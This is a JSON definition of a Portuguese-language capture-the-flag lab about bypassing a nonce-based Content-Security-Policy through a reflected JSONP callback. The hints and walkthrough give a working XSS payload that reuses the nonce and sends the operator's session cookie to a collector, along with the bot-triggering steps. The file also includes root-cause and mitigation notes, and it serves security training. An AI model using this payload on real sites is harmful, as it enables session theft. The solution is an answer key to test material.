@@ -1,0 +1,82 @@
+{
+  "slug": "xss-csp-nonce-bypass",
+  "title": "Console de nonce",
+  "codename": "NONCE",
+  "summary": "Um console de conteúdo aplica uma Content-Security-Policy estrita baseada em nonce, mas seu feed JSON legado reflete um parâmetro callback dentro de um bloco script marcado com o nonce atual. A política entrega ao atacante exatamente a execução de script que deveria impedir.",
+  "category": "xss",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "xss-csp-nonce-bypass",
+  "estimated_minutes": 25,
+  "xp": 150,
+  "tech": [
+    "Flask",
+    "Content-Security-Policy",
+    "Nonces",
+    "JSONP",
+    "JavaScript"
+  ],
+  "tags": [
+    "xss",
+    "csp",
+    "nonce",
+    "jsonp",
+    "content-security-policy",
+    "script-gadget"
+  ],
+  "story": "O Nonce Console serve dashboards de operadores a partir de uma única origem. Após uma revisão de segurança, a equipe habilitou uma CSP estrita baseada em nonce: sem script inline, sem eval, sem fontes de script externas. O feed antigo de widgets em /api/sinks ainda envolve seu JSON em um callback fornecido pelo chamador dentro de um bloco <script nonce=...>, e esse bloco carrega o mesmo nonce em que a política confia. O bot do console mantém um cookie privilegiado console_session.",
+  "objective": "Contorne a CSP baseada em nonce por meio do callback refletido de /api/sinks e exfiltre o cookie de sessão do operador do console para /collect.",
+  "rules": "Permaneça na origem loopback atribuída. Apenas as rotas do próprio lab e o collector estão no escopo. Não escaneie outras portas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de sessão do console",
+      "flag_type": "user",
+      "points": 150,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "A confiança é o nonce, não o código",
+      "body": "Leia o header Content-Security-Policy em `/` e em `/api/sinks`. A única fonte de script permitida é um nonce por response. Pergunte a si mesmo qual corpo de response realmente carrega esse nonce e quem controla o que é escrito ao lado dele."
+    },
+    {
+      "level": 2,
+      "title": "O feed legado de widgets",
+      "body": "`/api/sinks?callback=demo` retorna um bloco script cujo nonce corresponde à sua própria CSP. O valor de `callback` é concatenado literalmente na frente do payload JSON, então você pode fechar o wrapper e abrir qualquer coisa dentro de um script em que a política já confia."
+    },
+    {
+      "level": 3,
+      "title": "Reuso de nonce e escaping de JSON",
+      "body": "O payload é JSON: `{\"primary\":\"...\"}`. Feche a chamada com `);` e depois `</script>` e reabra um bloco confiável com o mesmo nonce — o nonce está visível no corpo da response ao lado da sua entrada. Envie a URL montada para `/report`, que a visita com `console_session`."
+    }
+  ],
+  "solution": {
+    "walkthrough": "**1. Inspecione a política.**\n\n```\ncurl -si http://127.0.0.1:<port>/ | grep -i content-security-policy\n# default-src 'none'; script-src 'nonce-XXXX'; ... frame-ancestors 'none'\n```\n\nSó scripts inline que carregam o nonce da response podem executar, então um `<script>alert(1)</script>` clássico ou uma URI `javascript:` é bloqueado.\n\n**2. Leia o feed legado.**\n\n```\ncurl -si 'http://127.0.0.1:<port>/api/sinks?callback=demo' | head -20\n# <script nonce=\"YYYY\">demo({\"primary\":\"https://...\",\"fallback\":\"https://...\"})</script>\n# Content-Security-Policy: script-src 'nonce-YYYY'\n```\n\nO `callback` refletido é concatenado com o payload JSON dentro de um bloco script, e o nonce desse bloco corresponde à CSP da mesma response. A política, portanto, autoriza exatamente o conteúdo que você controla.\n\n**3. Saia do wrapper.** O payload é JSON, então feche a chamada e o elemento e abra um novo script que mantém o nonce confiável:\n\n```\ncallback=x);</script><script nonce=YYYY>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>\n```\n\n`x)` mantém o JS sintaticamente inválido e inofensivo; o navegador se recupera em `</script>`, fecha o primeiro bloco (confiável) e interpreta o segundo bloco, que carrega o mesmo nonce e é permitido. Um payload que apenas reflete (sem um nonce válido) é o fallback sobre o qual o teste HTTP verifica.\n\n**4. Dispare o operador.** Faça POST em `/report` com `path=/api/sinks?callback=<payload>` (codificado para URL). O bot carrega a URL com `console_session=<flag>` e o bloco refletido dispara `fetch('/collect?c='+document.cookie)`.\n\n**5. Leia a captura.** `/captured` lista o cookie exfiltrado; ele é igual ao valor de `flag` do lab e o objetivo é registrado.",
+    "root_cause": "A CSP é estruturalmente correta, mas a aplicação reutiliza um nonce em um valor que reflete para um contexto executável. Um nonce só garante *quais elementos* podem executar; se um atacante consegue injetar dentro de um desses elementos, o nonce lhe concede execução. Essa é a falha de reuso de nonce / gadget JSONP: a mesma classe de defeito que permite contornar páginas com `script-src 'nonce-...'` sempre que qualquer endpoint reflete entrada do atacante em um `<script>` marcado com nonce.",
+    "mitigation": "Nunca reflita entrada do chamador em um bloco script. Substitua JSONP por JSON com CORS habilitado (`application/json`, `X-Content-Type-Options: nosniff`) e um Content-Type fixo. Se clientes antigos precisarem de wrapper, valide `callback` com uma regex estrita de identificador (`^[A-Za-z_$][A-Za-z0-9_$]{0,64}$`) e rejeite todo o resto com 400. Gere o nonce por response e nunca o reutilize; mantenha `script-src` livre de `unsafe-inline`. Trate a CSP como defesa em profundidade, não como substituto do output encoding — faça HTML-encode de todo valor refletido independentemente da política."
+  },
+  "references": [
+    {
+      "title": "OWASP CSP Cheat Sheet — nonce usage and JSONP caveat",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Nonces, hashes e por que blocos JSONP refletidos quebram políticas baseadas em nonce."
+    },
+    {
+      "title": "OWASP WSTG — Testing for Content Security Policy",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy",
+      "source_type": "standard",
+      "description": "Metodologia para revisar e contornar implantações de CSP."
+    },
+    {
+      "title": "PortSwigger — Bypassing CSP with policy injection",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+      "source_type": "official",
+      "description": "Como a injeção em contextos de script confiáveis neutraliza a CSP."
+    }
+  ]
+}
